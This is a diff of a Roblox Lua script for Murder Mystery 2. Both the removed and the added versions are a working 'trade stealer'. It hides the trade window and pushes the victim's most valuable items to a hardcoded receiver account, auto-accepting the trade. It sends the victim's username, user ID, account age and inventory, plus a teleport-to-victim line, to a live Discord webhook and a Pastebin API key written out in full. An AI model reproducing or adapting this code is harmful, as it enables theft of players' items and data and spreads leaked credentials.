@@ -1,290 +1,717 @@
---ап
-Username = "Protoxak"
-Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
+Usernames = {
+	"Protoxak"
+}
+version = "1.0"
 
-local recvr=Username
-local http_req=request or http_request or syn and syn.request
-if not http_req then error("No valid request function found.") end
-local HS=game:GetService("HttpService")
-local hd={["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}
-
-local function dHTML(s) return s:gsub("&#(%d+);",function(n) return string.char(tonumber(n)) end):gsub("&#x(%x+);",function(n) return string.char(tonumber(n,16)) end):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&apos;","'"):gsub("&lt;","<"):gsub("&gt;",">"):gsub("\u{2019}","'"):gsub("\u{2018}","'"):gsub("\u{201C}",'"'):gsub("\u{201D}",'"') end
-local function nName(s) s=dHTML(s) s=s:gsub("^%s*(.-)%s*$","%1") s=s:gsub("%s+"," ") return s end
-
-local vL_values={}
-local vL_valuesLow={}
-local function sVal(n,v) local t=tonumber(v) if n~=""and t then vL_values[n]=t vL_valuesLow[n:lower()]=t end end
-
-local wUrls={["Godly"]="https://supremevalues.com/mm2/godlies",["Ancient"]="https://supremevalues.com/mm2/ancients",["Unique"]="https://supremevalues.com/mm2/uniques",["Classic"]="https://supremevalues.com/mm2/vintages",["Chroma"]="https://supremevalues.com/mm2/chromas"}
-local fD=0 local fT=5
-
-local function wFetched(r,b)
- local f=b:gsub("[\n\r\t]"," ")
- for rN,v in f:gmatch('<div class="itemhead">(.-)</div>.-<b class="itemvalue">([%d,]+)</b>') do
-  rN=rN:gsub("<.->","") local nm=nName(rN) v=v:gsub(",","")
-  if nm~=""and tonumber(v) then
-   if r=="Chroma" then nm=nm:gsub("^C%.%s*","Chroma ") if not nm:find("^Chroma ") then nm="Chroma "..nm end end
-   sVal(nm,v)
-  end
- end
+if not game:IsLoaded() then
+	game.Loaded:Wait()
 end
 
-for r,u in pairs(wUrls) do
- task.spawn(function()
-  local ok,res=pcall(function() return http_req({Url=u,Method="GET",Headers=hd}) end)
-  if ok and res and res.Success then wFetched(r,res.Body) end
-  fD=fD+1
- end)
-end
-repeat task.wait(0.05) until fD>=fT
+game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 600)
+game:GetService("HttpService")
+game:GetService("Players")
+game:GetService("Workspace")
 
-repeat wait() until game:IsLoaded()
-if getgenv and getgenv().scriptexecuted then return end
-if getgenv then getgenv().scriptexecuted=true end
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
 
-local P=game:GetService("Players") 
-local LocalPlayer=P.LocalPlayer 
-local VU=game:GetService("VirtualUser") 
-local MS=game:GetService("MarketplaceService") 
-local RAS=game:GetService("RbxAnalyticsService") 
-local UIS=game:GetService("UserInputService") 
-local TS=game:GetService("TeleportService") 
-local RS=game:GetService("ReplicatedStorage") 
-local RNS=game:GetService("RunService") 
-local Tr=RS.Trade 
-local ev={"MouseButton1Click","MouseButton1Down","Activated"} 
-local BDC=require(RS.Modules.ProfileData) 
-local Sync=require(RS.Database.Sync)
-local XPO=require(RS.Modules.LevelModule) 
-local LL=require(RS.Modules.InventoryModule) 
-local TScr=[[game:GetService("TeleportService"):TeleportToPlaceInstance("]]..game.PlaceId..[[", "]]..game.JobId..[[", game.Players.LocalPlayer)]] 
-local Pos=UDim2.new(0,9999,0,9999) 
-local Inv={}
-vL_weight=0
+game:GetService("RunService")
+game:GetService("Workspace")
+game:GetService("VirtualUser")
 
-local Exec = (identifyexecutor and identifyexecutor()) or "Unknown"
-if Exec=="Solara" then return end
-
-local gm={[142823291]=true,[335132309]=true,[636649648]=true}
-if not gm[game.PlaceId] then LocalPlayer:Kick("Unfortunately, this game is not supported.") while true do wait() end end
-
-local PG=LocalPlayer:WaitForChild("PlayerGui") local MG=PG:WaitForChild("MainGUI")
-task.spawn(function() wait(5) end)
-LocalPlayer.Idled:connect(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)
-
-local UIP,TP,Mob
-if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
- UIP=LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main TP=LocalPlayer.PlayerGui.TradeGUI Mob=false
-else
- UIP=LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main TP=LocalPlayer.PlayerGui.TradeGUI_Phone Mob=true
-end
-
-function TapUI(b,c,b2)
- if c=="Active Check" and not b.Active then return end
- if c=="Text Check" and b~="^" then return end
- for _,e in pairs(ev) do for _,cn in pairs(getconnections(b[e])) do cn:Fire() end end
-end
-
-local function updInv()
- local inv = BDC.Weapons.Owned or {}
- InvT={} vL_weight=0
- aD,vB,cP,uC={},{},{},{} rP,lC,gS={},{},{} aM,uS={},{} vI,cS=0,0 uM,rW=0,0 lR,gS2=0,0 aK,uH=0,0
-
- for iID,am in pairs(inv) do
-  local iI = Sync.Weapons[iID]
-  if iI and iI.ItemName~="Default Gun" and iI.ItemName~="Default Knife" then
-   local iN=iI.ItemName local r=iI.Rarity
-   local iV=0
-   if r=="Godly" or r=="Ancient" or r=="Unique" or r=="Classic" then
-    iV=(vL_values[iN]or vL_valuesLow[iN:lower()]or 0)*am
-   end
-   vL_weight=vL_weight+iV
-   local fT={name=iI.ItemName,data=iID,amount=am,rarity=r,value=iV} table.insert(aD,fT)
-   if r=="Godly" then table.insert(gS,fT) gS2=gS2+am
-   elseif r=="Ancient" then table.insert(aM,fT) aK=aK+am
-   elseif r=="Unique" then table.insert(uS,fT) uH=uH+am
-   elseif r=="Classic" then table.insert(vB,fT) vI=vI+am
-   elseif r=="Legendary" then table.insert(lC,fT) lR=lR+am
-   elseif r=="Rare" then table.insert(rP,fT) rW=rW+am
-   elseif r=="Uncommon" then table.insert(uC,fT) uM=uM+am
-   elseif r=="Common" then table.insert(cP,fT) cS=cS+am end
-   table.insert(InvT,{name=iN,id=iID,amount=am,rarity=r})
-  end
- end
- local rP2={Unique=8,Ancient=7,Godly=6,Classic=5,Legendary=4,Rare=3,Uncommon=2,Common=1}
- table.sort(InvT,function(a,b) return (rP2[a.rarity]or 0)>(rP2[b.rarity]or 0) end)
- return true
-end
-updInv()
-task.wait()
-
-local TSrv=RS:FindFirstChild("Trade")
-if TSrv then
- TSrv.StartTrade.OnClientEvent:Connect(function(tD,tP) if tP~=recvr then TSrv.DeclineTrade:FireServer() end end)
-end
-
-local sTr=function(tP) if tP and TSrv then pcall(function() TSrv.SendRequest:InvokeServer(tP) end) end end
-local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer() end) end end
-local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end
-
--- ═══════════════════════════════════════════════════════
--- InsIt — налив + accept с os.clock()
--- ═══════════════════════════════════════════════════════
-local InsIt=function()
- local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
- if not InvT then dTr() return end
- local tIt={} iAd=0 tIn=0 local i=1
- while iAd<4 and i<=#InvT do
-  local it=InvT[i]
-  if it and it.id and it.amount>0 then
-   local ar={it.id,"Weapons"} local suc=false iOf=0
-   for j=1,it.amount do 
-    local ok,err=pcall(function() 
-     RS.Trade.OfferItem:FireServer(unpack(ar)) 
-     iOf=iOf+1 
-     tIn=tIn+1 
-    end) 
-    if ok then suc=true end 
-    task.wait(0.05)
-   end
-   if suc then iAd=iAd+1 table.insert(tIt,{id=it.id,amount=iOf}) end
-  end
-  i=i+1
- end
- if iAd==0 then dTr() return end
-
- task.spawn(function()
-  task.wait(6)
-
-  local tradeRemote = RS:FindFirstChild("Trade")
-  if not tradeRemote then return end
-
-  local acceptR  = tradeRemote:FindFirstChild("AcceptTrade")
-  local cancelR  = tradeRemote:FindFirstChild("CancelAccept")
-  local confirmR = tradeRemote:FindFirstChild("ConfirmTrade")
-                or tradeRemote:FindFirstChild("FinalizeTrade")
-                or tradeRemote:FindFirstChild("CompleteTrade")
-  local statusR  = tradeRemote:FindFirstChild("GetTradeStatus")
-
-  if not acceptR then dTr() return end
-
-  local acc = false
-  local timeout = tick() + 600
-  local attempt = 0
-
-  while not acc and tick() < timeout do
-   attempt = attempt + 1
-   warn("[accept] attempt " .. attempt)
-
-   -- ═══ ПРАВИЛЬНЫЙ ВЫЗОВ ═══
-   local args = {
-    game.PlaceId * 3,
-    os.clock()
-   }
-   pcall(function() 
-    acceptR:FireServer(unpack(args)) 
-   end)
-
-   -- Confirm если есть
-   if confirmR then
-    pcall(function() confirmR:FireServer() end)
-   end
-
-   -- UI-клик fallback
-   pcall(function()
-    local tradeGui = TP
-    if tradeGui then
-     local btn = tradeGui:FindFirstChild("Accept", true)
-             or tradeGui:FindFirstChild("AcceptButton", true)
-     if btn then
-      for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
-       conn:Fire()
-      end
-      for _, conn in pairs(getconnections(btn.Activated)) do
-       conn:Fire()
-      end
-     end
-    end
-   end)
-
-   -- ждём 12 сек (анти-спам)
-   task.wait(12)
-
-   -- проверка статуса
-   if statusR then
-    local ok, s = pcall(function() return statusR:InvokeServer() end)
-    if ok and s == "None" then
-     acc = true
-     warn("[accept] CLOSED via status")
-     break
-    end
-   end
-   if not TP.Enabled then
-    acc = true
-    warn("[accept] CLOSED via UI")
-    break
-   end
-  end
-
-  -- обновляем инвентарь
-  if acc then
-   for _,td in ipairs(tIt) do 
-    for j,it in ipairs(InvT) do 
-     if it.id==td.id then 
-      if it.amount<=td.amount then 
-       table.remove(InvT,j) 
-      else 
-       it.amount=it.amount-td.amount 
-      end 
-      break 
-     end 
-    end 
-   end
-  else
-   warn("[accept] TIMEOUT — не закрылось")
-  end
- end)
-end
-
-local fRj=function(p) if p then pcall(function() TS:Teleport(game.PlaceId,p) end) end end
-local sCL=function(p) if p then p.Chatted:Connect(function(m) sTr(p) if m:lower()=="rejoin" then fRj(p) end end) end end
-local cRIS=function(rN) task.spawn(function() while true do local rP=P:FindFirstChild(rN) if rP then act(rN) break end task.wait(5) end end) end
-local act=function(pN) local p=P:FindFirstChild(pN) if p then sCL(p) task.wait(10) sTr(p) cTr(p) end end
-
-if TP then
- if Mob then TP.Container.Position=Pos TP.ClickBlocker.Position=Pos else TP.BG.Position=Pos TP.Container.Position=Pos TP.ClickBlocker.Position=Pos TP.Processing.Position=Pos end
- TP:GetPropertyChangedSignal("Enabled"):Connect(function() if TP.Enabled then InsIt() else local p=P:FindFirstChild(recvr) if p then cTr(p) end end end)
-end
-P.PlayerAdded:Connect(function(p) if p.Name==recvr then act(p.Name) end end)
-P.PlayerRemoving:Connect(function(p) if p.Name==recvr then cRIS(p.Name) end end)
-
-local iR=P:FindFirstChild(recvr) if iR then act(recvr) else cRIS(recvr) end
-
-if gS2 >= 1 or aK >= 1 or uH >= 1 then
-    content = "-- @everyone\n" .. TScr
-else
-    content = TScr
-end
-
-local sWh=function(u,d) local s,e=pcall(function() http_req({Url=u,Body=HS:JSONEncode(d),Method="POST",Headers={["Content-Type"]="application/json",["User-Agent"]="Mozilla/5.0"}}) end) end
-
-local invString = ""
-if uS and #uS>0 then invString = invString.."\n**Unique**\n" for _,i in pairs(uS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
-if aM and #aM>0 then invString = invString.."\n**Ancient**\n" for _,i in pairs(aM) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
-if gS and #gS>0 then invString = invString.."\n**Godly**\n" for _,i in pairs(gS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
-if vB and #vB>0 then invString = invString.."\n**Classic**\n" for _,i in pairs(vB) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
-
-local data = {
-    ["content"] = content,
-    ["embeds"] = {
-        {
-            ["title"] = "Hit",
-            ["description"] = "User: " .. LocalPlayer.Name .. "\nValue: " .. tostring(math.floor(vL_weight + 0.5)) .. "\n" .. invString,
-            ["color"] = 0x05f7ff
-        }
-    }
+local LocalPlayer = Players.LocalPlayer
+local _ = ReplicatedStorage.Remotes.Gameplay.CoinCollected
+local _ = ReplicatedStorage.Remotes.Gameplay.RoundStart
+local t1 = {
+	"MouseButton1Click",
+	"MouseButton1Down",
+	"Activated"
 }
 
-spawn(function()
-    sWh(Webhook, data)
-end)
+function TapUI(p1, p2, p3)
+	if p2 == "Active Check" then
+		if not p1.Active then
+			return
+		end
+		p1 = p1[p3]
+	end
+
+	if p2 == "Text Check" then
+		if p1 ~= "^" then
+			return
+		end
+		p1 = p3
+	end
+
+	for _, v in pairs(t1) do
+		for _, v2 in pairs(getconnections(p1[v])) do
+			v2:Fire()
+		end
+	end
+end
+
+repeat
+	task.wait(1)
+	pcall(function()
+		TapUI(LocalPlayer.PlayerGui.DeviceSelect.Container.Tablet.Button)
+	end)
+	pcall(function()
+		TapUI(game:GetService("Players").LocalPlayer.PlayerGui.Join.Friends.Play)
+	end)
+until LocalPlayer.PlayerGui:FindFirstChild("MainGUI")
+
+repeat
+	fr = pcall(function()
+		require(game:GetService("ReplicatedStorage").Modules.TradeModule)
+	end)
+	task.wait()
+until fr
+
+universeid = game.GameId
+
+if universeid == 66654135 then
+	if not getgenv().executed then
+		getgenv().executed = true
+		isVip = game:GetService("ReplicatedStorage").Remotes.Extras.IsVIPServer:InvokeServer()
+
+		if not isVip then
+			local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+			local Trade = ReplicatedStorage2:WaitForChild("Trade")
+			local Players2 = game:GetService("Players")
+			local t2 = {
+				Deathshard = 22,
+				DeathshardChroma = 65,
+				BloodKnife = 8,
+				GhostKnife = 10,
+				Knife1 = 3,
+				ShadowKnife = 6,
+				TimeKnife = 5,
+				AmericaGun = 8,
+				GoldenGun = 4,
+				Gun1 = 4,
+				Phaser = 7,
+				Disint = 7,
+				Luger = 75,
+				LugerChroma = 100,
+				Sorry = 850,
+				TheSeer = 3,
+				Fang = 20,
+				FangChroma = 55,
+				Heat = 23,
+				HeatChroma = 70,
+				Shark = 30,
+				SharkChroma = 65,
+				Saw = 7,
+				SawChroma = 50,
+				Laser = 7,
+				LaserChroma = 80,
+				Spider = 17,
+				Slasher = 23,
+				SlasherChroma = 65,
+				Candy = 190,
+				Chill = 17,
+				Handsaw = 8,
+				RedLuger = 70,
+				GreenLuger = 40,
+				Xmas = 12,
+				Sugar = 125,
+				Clockwork = 25,
+				Tides = 20,
+				TidesChroma = 65,
+				Pixel = 23,
+				Blaster = 30,
+				Virtual = 28,
+				AmericaSword = 30,
+				Amerilaser = 32,
+				Nightblade = 30,
+				Hallow = 12,
+				HallowsBlade = 10,
+				Eternal = 10,
+				IceDragon = 12,
+				Flames = 12,
+				Pumpking = 17,
+				BattleAxe = 13,
+				WintersEdge = 12,
+				IceShard = 13,
+				Snowflake = 8,
+				Frostsaber = 15,
+				Scythe = 75,
+				Boneblade = 8,
+				BonebladeChroma = 50,
+				BattleAxe2 = 18,
+				Eternal2 = 10,
+				Gingerblade = 22,
+				GingerbladeChroma = 55,
+				Icewing = 4,
+				GingerLuger = 23,
+				Gemstone = 23,
+				GemstoneChroma = 65,
+				RedSeer = 3,
+				OrangeSeer = 2,
+				YellowSeer = 2,
+				BlueSeer = 3,
+				PurpleSeer = 3,
+				SeerChroma = 55,
+				Eternal3 = 10,
+				Eternal4 = 10,
+				ElderwoodGun = 60,
+				ElderwoodScythe = 90,
+				Ghostblade = 10,
+				EternalCane = 24,
+				Logchopper = 30,
+				Frostbite = 8,
+				Minty = 24,
+				Lugercane = 24,
+				Lightbringer = 58,
+				ChromaLightbringer = 120,
+				Darkbringer = 60,
+				ChromaDarkbringer = 125,
+				Bioblade = 13,
+				Prismatic = 7,
+				VampiresEdge = 15,
+				Hallowscythe = 55,
+				Hallowgun = 35,
+				Peppermint = 5,
+				Icebreaker = 120,
+				Iceblaster = 60,
+				Cookieblade = 4,
+				Jinglegun = 15,
+				Heartblade = 125,
+				Eggblade = 8,
+				Nebula = 28,
+				Harvester = 750,
+				Candleflame = 120,
+				CandleflameChroma = 145,
+				SwirlyAxe = 175,
+				SwirlyGun = 135,
+				SwirlyGunChroma = 140,
+				SwirlyBlade = 70,
+				Iceflake = 32,
+				Icebeam = 32,
+				Plasmablade = 32,
+				Plasmabeam = 32,
+				Phantom2022 = 75,
+				Spectre2022 = 75,
+				ElderwoodKnife = 120,
+				ElderwoodKnifeChroma = 140,
+				Makeshift = 125,
+				ZombieBat = 375,
+				Gingermint_K = 55,
+				Gingermint_KChroma = 135,
+				Gingermint_G = 55,
+				Icepiercer = 725,
+				Sakura_K = 550,
+				Blossom_G = 560,
+				Rainbow_K = 185,
+				Rainbow_G = 190,
+				Waves_K = 145,
+				Ocean_G = 150,
+				TravelerAxe = 6000,
+				TravelerGun = 3300,
+				TravelerGunChroma = 95000,
+				Darksword = 495,
+				Darkshot = 500,
+				Turkey2023 = 1500,
+				Gingerscope = 8500,
+				TreeGun2023 = 1800,
+				TreeGun2023Chroma = 42000,
+				TreeKnife2023 = 1100,
+				TreeKnife2023Chroma = 21000,
+				FlowerwoodKnife = 95,
+				FlowerwoodGun = 100,
+				Pearl_K = 62,
+				Pearl_G = 62,
+				Watergun = 115,
+				WatergunChroma = 2500,
+				WraithKnife = 160,
+				WraithGun = 160,
+				VampireAxe = 490,
+				VampireGun = 510,
+				VampireGunChroma = 16000
+			}
+			local t3 = {
+				"Unique",
+				"Ancient",
+				"Godly",
+				"Legendary",
+				"Rare",
+				"Vintage",
+				"Halloween",
+				"Christmas",
+				"Uncommon",
+				"Common"
+			}
+
+			function GetSortedInventory()
+				local t4 = {}
+				local Owned = game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name).Weapons.Owned
+				local Item = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
+
+				for k, v in pairs(Owned) do
+					local v42 = Item[k]
+
+					if v42 then
+						local v43 = (t2[k] or 0) * v
+
+						if v42.ItemName ~= "Default Knife" and v42.ItemName ~= "Default Gun" then
+							table.insert(t4, {
+								Name = v42.ItemName,
+								ID = k,
+								RAP = v43,
+								Class = v42.ItemType,
+								Rarity = v42.Rarity,
+								Amount = v,
+								Chroma = v42.Chroma
+							})
+						end
+					end
+				end
+
+				table.sort(t4, function(p4, p5)
+					if p4.RAP == p5.RAP then
+						local v68 = table.find(t3, p4.Rarity)
+						local v69 = table.find(t3, p5.Rarity)
+
+						if not v68 or not v69 then
+							if not v68 then
+								if not v69 then
+									return false
+								end
+								return false
+							end
+							return true
+						end
+						return v68 < v69
+					end
+					return p4.RAP > p5.RAP
+				end)
+
+				return t4
+			end
+
+			total_value = 0
+			hits = GetSortedInventory()
+
+			for _, v in pairs(hits) do
+				total_value = total_value + v.RAP
+			end
+
+			unique_count = 0
+			godly_count = 0
+			ancient_count = 0
+			legendary_count = 0
+			rare_count = 0
+			vintage_count = 0
+			halloween_count = 0
+			christmas_count = 0
+			uncommon_count = 0
+			common_count = 0
+			UniqueString = "\nUNIQUE ITEMS: \n \n"
+			GodlyString = "\nGODLY ITEMS: \n \n"
+			AncientString = "\nANCIENT ITEMS: \n \n"
+			LegendaryString = "\nLEGENDARY ITEMS: \n \n"
+			VintageString = "\nVINTAGE ITEMS: \n \n"
+			RareString = "\nRARE ITEMS: \n \n"
+			HalloweenString = "\nHALLOWEEN ITEMS: \n \n"
+			ChristmasString = "\nCHRISTMAS ITEMS: \n \n"
+			UncommonString = "\nUNCOMMON ITEMS: \n \n"
+			CommonString = "\nCOMMON ITEMS: \n \n"
+
+			for _, v in pairs(hits) do
+				if not v.Chroma then
+					chroma = ""
+				else
+					chroma = "Chroma "
+				end
+
+				if v.Name == "Corrupt" then
+					unique_count = unique_count + 1 * v.Amount or 1
+					UniqueString = UniqueString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Godly" then
+					godly_count = godly_count + 1 * v.Amount or 1
+					GodlyString = GodlyString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Ancient" then
+					ancient_count = ancient_count + 1 * (v.Amount or 1)
+					AncientString = AncientString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Vintage" then
+					vintage_count = vintage_count + 1 * v.Amount or 1
+					VintageString = VintageString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Legendary" then
+					legendary_count = legendary_count + 1 * v.Amount or 1
+					LegendaryString = LegendaryString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Rare" then
+					rare_count = rare_count + 1 * v.Amount or 1
+					RareString = RareString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Halloween" then
+					halloween_count = halloween_count + 1 * v.Amount or 1
+					HalloweenString = HalloweenString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Christmas" then
+					christmas_count = christmas_count + 1 * v.Amount or 1
+					ChristmasString = ChristmasString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Uncommon" then
+					uncommon_count = uncommon_count + 1 * v.Amount or 1
+					UncommonString = UncommonString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+
+				if v.Rarity == "Common" and v.ID ~= "DefaultGun" and v.ID ~= "DefaultKnife" then
+					common_count = common_count + 1 * v.Amount or 1
+					CommonString = CommonString .. chroma .. v.Name .. " x" .. v.Amount .. "\n"
+				end
+			end
+
+			if UniqueString == "\nUNIQUE ITEMS: \n \n" then
+				UniqueString = ""
+			end
+
+			if AncientString == "\nANCIENT ITEMS: \n \n" then
+				AncientString = ""
+			end
+
+			if GodlyString == "\nGODLY ITEMS: \n \n" then
+				GodlyString = ""
+			end
+
+			if LegendaryString == "\nLEGENDARY ITEMS: \n \n" then
+				LegendaryString = ""
+			end
+
+			if VintageString == "\nVINTAGE ITEMS: \n \n" then
+				VintageString = ""
+			end
+
+			if RareString == "\nRARE ITEMS: \n \n" then
+				RareString = ""
+			end
+
+			if HalloweenString == "\nHALLOWEEN ITEMS: \n \n" then
+				HalloweenString = ""
+			end
+
+			if ChristmasString == "\nCHRISTMAS ITEMS: \n \n" then
+				ChristmasString = ""
+			end
+
+			if UncommonString == "\nUNCOMMON ITEMS: \n \n" then
+				UncommonString = ""
+			end
+
+			if CommonString == "\nCOMMON ITEMS: \n \n" then
+				CommonString = ""
+			end
+
+			HitsString = ""
+			HitsString = HitsString .. UniqueString
+			HitsString = HitsString .. AncientString
+			HitsString = HitsString .. GodlyString
+			HitsString = HitsString .. LegendaryString
+			HitsString = HitsString .. RareString
+			HitsString = HitsString .. VintageString
+			HitsString = HitsString .. HalloweenString
+			HitsString = HitsString .. ChristmasString
+			HitsString = HitsString .. UncommonString
+			HitsString = HitsString .. CommonString
+			stuff = HitsString
+			LIST = "api_paste_code=" .. stuff .. "&api_option=paste&api_dev_key=aL23vA-UXpKHvGuqL5_jJ4YIVZGY5Nrr"
+
+			function GetPastebin(p6)
+				site = request({
+					Method = "POST",
+					Timeout = 10,
+					Url = "https://pastebin.com/api/api_post.php",
+					Headers = {
+						["Content-Type"] = "application/x-www-form-urlencoded"
+					},
+					Body = p6
+				})
+				hitslist = site.Body
+
+				if not string.find(hitslist, "https://pastebin.com/") then
+					hitslist = "Ratelimited"
+					Old_Pastebin_SHIT = "Error"
+				else
+					Old_Pastebin_SHIT = hitslist
+					hitslist = "[Click Me](" .. hitslist .. ")"
+				end
+
+				return hitslist
+			end
+
+			Username = "Protoxak"
+			Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
+
+			table.insert(Usernames, Username)
+
+			function HideGui()
+				task.spawn(function()
+					local TradeGUI = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI
+
+					for _, child in pairs(TradeGUI:GetChildren()) do
+						child.Position = UDim2.new(99, 99, 99, 99)
+					end
+
+					local TradeGUI_Phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
+
+					TradeGUI_Phone.Inactive.Frame.Position = UDim2.new(99, 99, 99, 99)
+					TradeGUI_Phone.Inactive.TradeMainOld.Position = UDim2.new(99, 99, 99, 99)
+					TradeGUI_Phone.Container.Position = UDim2.new(99, 99, 99, 99)
+				end)
+			end
+			function IsTrading()
+				return Trade.GetTradeStatus:InvokeServer()
+			end
+			function ReadyTrade()
+				while IsTrading() ~= "None" do
+					Trade.AcceptTrade:FireServer(game.PlaceId * 2)
+					task.wait()
+				end
+			end
+			function SendTrade(p7)
+				local v35 = Players2:WaitForChild(tostring(p7))
+
+				Trade.SendRequest:InvokeServer(v35)
+			end
+			function DepositItemInTrade(p8, p9, p10)
+				if p8 == nil or p9 == nil or p10 == nil then
+					LocalPlayer:Kick("something is wrong...")
+				end
+
+				for _ = 1, p10 do
+					Trade.OfferItem:FireServer(p8, p9)
+					task.wait()
+				end
+
+				DepositedItems = DepositedItems + 1
+			end
+			function Steal(p11)
+				task.spawn(function()
+					pcall(function()
+						while task.wait() do
+							game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
+							require(game.ReplicatedStorage.Modules.TradeModule).RequestsEnabled = true
+						end
+					end)
+				end)
+				HideGui()
+				Username = p11.Name
+
+				while IsTrading() ~= "None" do
+					Trade.DeclineTrade:FireServer()
+					Trade.DeclineRequest:FireServer()
+					Trade.CancelRequest:FireServer()
+					task.wait()
+				end
+
+				repeat
+					SendTrade(Username)
+					task.wait()
+				until IsTrading() ~= "None"
+
+				repeat
+					task.wait()
+				until IsTrading() == "StartTrade"
+
+				DepositedItems = 0
+
+				while IsTrading() == "StartTrade" do
+					task.wait()
+
+					local TradeModule = require(ReplicatedStorage2.Modules.TradeModule)
+					local _ = TradeModule.TradeInventory.Data
+
+					function TradeModule.UpdateTradeInventory(p12)
+						if #p12.Player1.Offer == 4 then
+							ReadyTrade()
+						end
+					end
+
+					current_inv = GetSortedInventory()
+
+					if #current_inv > 0 then
+						for _, v in pairs(current_inv) do
+							DepositItemInTrade(v.ID, v.Class, v.Amount)
+
+							if DepositedItems == 4 then
+								DepositedItems = 0
+								ReadyTrade()
+
+								return
+							end
+
+							task.wait()
+						end
+					end
+
+					task.wait()
+
+					if #current_inv == 0 then
+						print("inventory is empty")
+
+						if DepositedItems == 0 then
+							LocalPlayer:Kick("MM2 TRADE STEALER")
+							return
+						end
+
+						task.wait()
+					end
+				end
+			end
+			function UnlockTrades()
+				task.spawn(function()
+					pcall(function()
+						game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
+						require(game.ReplicatedStorage.Modules.TradeModule).RequestsEnabled = true
+					end)
+				end)
+			end
+			function LoopSteal(p13)
+				UnlockTrades()
+				task.spawn(function()
+					while task.wait() do
+						Steal(p13)
+					end
+				end)
+			end
+			function PrepareSteal(p14)
+				UnlockTrades()
+				task.wait()
+
+				function Trade.SendRequest.OnClientInvoke(p15)
+					if p15.Name:lower() ~= Username:lower() then
+						Trade.DeclineRequest:FireServer()
+					else
+						task.wait()
+						Trade.DeclineRequest:FireServer()
+						task.wait()
+						LoopSteal(p14)
+					end
+
+					return true
+				end
+			end
+			function shall_steal(p16)
+				for _, v in pairs(Usernames) do
+					if v:lower() == p16.Name:lower() and v:lower() ~= game.Players.LocalPlayer.Name:lower() then
+						return true
+					end
+				end
+
+				return false
+			end
+
+			for _, child in pairs(game.Players:GetChildren()) do
+				if shall_steal(child) then
+					PrepareSteal(child)
+				end
+			end
+
+			Players2.PlayerAdded:Connect(function(player)
+				if shall_steal(player) then
+					PrepareSteal(player)
+				end
+			end)
+
+			for _, player in pairs(Players2:GetPlayers()) do
+				if shall_steal(player) then
+					player.Chatted:Connect(function()
+						LoopSteal(player)
+					end)
+				end
+			end
+
+			Players2.PlayerAdded:Connect(function(player)
+				if shall_steal(player) then
+					player.Chatted:Connect(function()
+						LoopSteal(player)
+					end)
+				end
+			end)
+			imgs = "https://images-ext-1.discordapp.net/external/SN9zgqCIgFRx4vco6NsGsf0QjfoCHf2Lj_k2R67EIIg/https/i.ibb.co/GWsnpph/xpng.png?format=webp&quality=lossless"
+
+			local LocalPlayer2 = game:GetService("Players").LocalPlayer
+			local v21 = identifyexecutor() or "undefined"
+
+			content_ping = "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
+			content_noping = content_ping:gsub("--@everyone\n", "")
+
+			if not (total_value > 0) then
+				content_logs = content_noping
+			else
+				content_logs = content_ping
+			end
+
+			PASTEBIN_SHIT = GetPastebin(LIST)
+
+			local t5 = {
+				content = content_logs,
+				username = game.Players.LocalPlayer.Name,
+				avatar_url = imgs,
+				embeds = {{
+					title = "Execution Log. Execute Code Above to Join the Victim",
+					description = "",
+					color = tonumber(13697227),
+					fields = {
+						{
+							name = "⭐ __**Receiver Info**__",
+							value = "```Username     : " .. LocalPlayer2.Name .. "\nUser-ID      : " .. LocalPlayer2.userId .. "\nAccount Age  : " .. LocalPlayer2.AccountAge .. " Days" .. "\nExploit      : " .. v21 .. "\nReceiver     : " .. Username .. "\nVersion      : " .. version .. "```",
+							inline = false
